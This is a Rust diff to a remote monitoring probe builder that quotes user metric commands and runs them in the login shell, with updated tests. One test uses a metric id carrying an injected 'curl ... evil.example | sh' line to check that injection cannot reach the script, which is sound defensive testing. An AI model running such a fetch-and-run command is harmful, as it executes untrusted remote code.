@@ -1096,15 +1096,20 @@ fn probe_nonce() -> String {
 fn build_probe_script(customs: &[CustomMetric], nonce: &str) -> String {
     let mut s = String::from(BUILTIN_PROBE);
     for (idx, cm) in customs.iter().enumerate() {
-        // We isolate each custom command in its own subshell so a `cd` or
-        // `set -e` inside one user command can't bleed into the next. The
-        // command sits on lines of its own inside the parentheses, so one
-        // ending in a `# comment` can't comment out the closing `)`.
+        // The probe is sh's (remote_sh), but a custom command is the user's
+        // own, written for the shell they type in: it runs in the account's
+        // login shell ($SHELL), as it did when that shell read the whole
+        // probe. It goes there as one quoted word, in a process of its own,
+        // so a `cd` or `set -e` inside one user command can't bleed into the
+        // next, and one that doesn't parse (an unclosed quote) fails alone:
+        // sh reads the whole probe before it runs any of it, and the
+        // built-in readings and the other metrics still come. A `# comment`
+        // at its end ends with the word.
         s.push_str(&format!(
-            "\nprintf '\\n%s\\n' '{begin}{nonce}_{idx}'\n(\n{cmd}\n) 2>/dev/null\nprintf '\\n%s\\n' '{end}{nonce}_{idx}'\n",
+            "\nprintf '\\n%s\\n' '{begin}{nonce}_{idx}'\n\"${{SHELL:-/bin/sh}}\" -c {cmd} 2>/dev/null\nprintf '\\n%s\\n' '{end}{nonce}_{idx}'\n",
             begin = CUSTOM_BEGIN,
             end = CUSTOM_END,
-            cmd = cm.command.replace('\r', ""),
+            cmd = crate::docker::shq(&cm.command.replace('\r', "")),
         ));
     }
     s
@@ -1144,8 +1149,10 @@ async fn poll_once(
         .channel_open_session()
         .await
         .map_err(|e| format!("open session: {}", e))?;
-    channel
-        .exec(true, script.as_bytes())
+    // sh reads the probe whatever the login shell is (csh has no `2>`).
+    // Sending it and reading what it prints share the time limit.
+    let deadline = tokio::time::Instant::now() + poll_timeout;
+    crate::remote_sh::run_script(&channel, &script, deadline)
         .await
         .map_err(|e| format!("exec: {}", e))?;
     let mut stream = channel.into_stream();
@@ -1177,7 +1184,7 @@ async fn poll_once(
             }
         }
     };
-    tokio::time::timeout(poll_timeout, read_fut)
+    tokio::time::timeout_at(deadline, read_fut)
         .await
         .map_err(|_| "probe script timed out".to_string())?;
     drop(stream);
@@ -1494,8 +1501,8 @@ mod probe_tests {
         let evil = metric("x\ncurl -fsS https://evil.example/s | sh\n#", "uptime");
         let script = build_probe_script(&[evil], "abc123");
         assert!(!script.contains("evil.example"), "id leaked into the probe script");
-        // The visible command is still there, in its own subshell.
-        assert!(script.contains("(\nuptime\n) 2>/dev/null"));
+        // The visible command is still there, for the login shell to run.
+        assert!(script.contains("\"${SHELL:-/bin/sh}\" -c 'uptime' 2>/dev/null"));
         assert!(script.contains("__SUB_C_BEGIN__abc123_0"));
     }
 
@@ -1628,9 +1635,48 @@ mod probe_tests {
     #[test]
     fn a_trailing_comment_cannot_swallow_the_subshell() {
         // `cmd # note` on the same line as `)` would comment it out and break
-        // every metric after it; the command gets lines of its own.
+        // every metric after it; the command is one quoted word.
         let script = build_probe_script(&[metric("a", "df -h / | tail -1 # root")], "c");
-        assert!(script.contains("(\ndf -h / | tail -1 # root\n) 2>/dev/null"));
+        assert!(script.contains("-c 'df -h / | tail -1 # root' 2>/dev/null"));
+        let script = build_probe_script(&[metric("a", "echo 'it''s'")], "c");
+        assert!(script.contains(r#"-c 'echo '"'"'it'"'"''"'"'s'"'"'' 2>/dev/null"#), "{script}");
+    }
+
+    /// The probe as the server's sh gets it (remote_sh): each metric runs in
+    /// the login shell ($SHELL); one that doesn't parse, ends in a comment,
+    /// reads stdin or exits fails or ends on its own, and the built-in
+    /// readings and the other metrics still come.
+    #[cfg(unix)]
+    #[test]
+    fn one_broken_metric_leaves_the_rest_of_the_probe_alone() {
+        use std::io::Write;
+        let customs = [
+            metric("bad", "echo \"unclosed"),
+            metric("comment", "echo 7 # note )"),
+            metric("stdin", "cat; echo read"),
+            metric("exit", "echo 1; exit 3"),
+            metric("shell", "echo \"$0\""),
+            metric("last", "printf ok"),
+        ];
+        let script = crate::remote_sh::whole(&build_probe_script(&customs, "u"));
+        let mut sh = std::process::Command::new("sh")
+            .arg("-s")
+            .env("SHELL", "/bin/sh")
+            .stdin(std::process::Stdio::piped())
+            .stdout(std::process::Stdio::piped())
+            .spawn()
+            .unwrap();
+        sh.stdin.take().unwrap().write_all(script.as_bytes()).unwrap();
+        let out = sh.wait_with_output().unwrap();
+        let text = String::from_utf8_lossy(&out.stdout);
+        let snap = parse_probe(&text, "u", &customs, false).unwrap();
+        assert!(snap.load1 >= 0.0 && text.contains("\nLOAD "), "{text}");
+        assert_eq!(snap.custom_text.get("bad").map(String::as_str), Some(""), "{text}");
+        assert_eq!(snap.custom_text["comment"], "7");
+        assert_eq!(snap.custom_text["stdin"], "read");
+        assert_eq!(snap.custom_text["exit"], "1");
+        assert_eq!(snap.custom_text["shell"], "/bin/sh");
+        assert_eq!(snap.custom_text["last"], "ok");
     }
 }
 
